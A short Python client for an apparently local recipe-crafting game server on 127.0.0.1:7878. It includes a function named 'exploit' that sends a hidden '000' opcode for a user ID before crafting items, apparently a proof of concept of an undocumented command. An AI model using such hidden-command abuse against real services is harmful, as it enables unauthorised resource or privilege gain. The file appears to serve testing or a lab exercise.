import socket

HOST = "127.0.0.1"
PORT = 7878  

def get_user(userid):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(f"001\r\n{userid}\r\n".encode('utf-8'))
        data = s.recv(1024)

    print(f"{str(data, 'UTF-8')}\r\n")

def available_recipes(userid):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(f"004\r\n{userid}\r\n".encode('utf-8'))
        data = s.recv(1024)

    print(f"{str(data, 'UTF-8')}\r\n")

def exploit(userid):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(f"000\r\n{userid}\r\n".encode('utf-8'))
        data = s.recv(1024)

    print(f"{str(data, 'UTF-8')}\r\n")

def get_recipes():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(f"002\r\n".encode('utf-8'))
        data = s.recv(1024)

    print(f"{str(data, 'UTF-8')}\r\n")

def get_recipe(id):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(f"003\r\n{id}\r\n".encode('utf-8'))
        data = s.recv(1024)

    print(f"{str(data, 'UTF-8')}\r\n")

def craft(userid, recipe_id, quantity):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(f"005\r\n{userid}\r\n{quantity}\r\n{recipe_id}\r\n".encode('utf-8'))
        data = s.recv(1024)

    print(f"{str(data, 'UTF-8')}\r\n")

print('')
exploit(331431342438875137)
get_user(331431342438875137)
#//get_recipes()
#//get_recipe(0)
available_recipes(331431342438875137)
craft(331431342438875137, 0, 1)
get_user(331431342438875137)
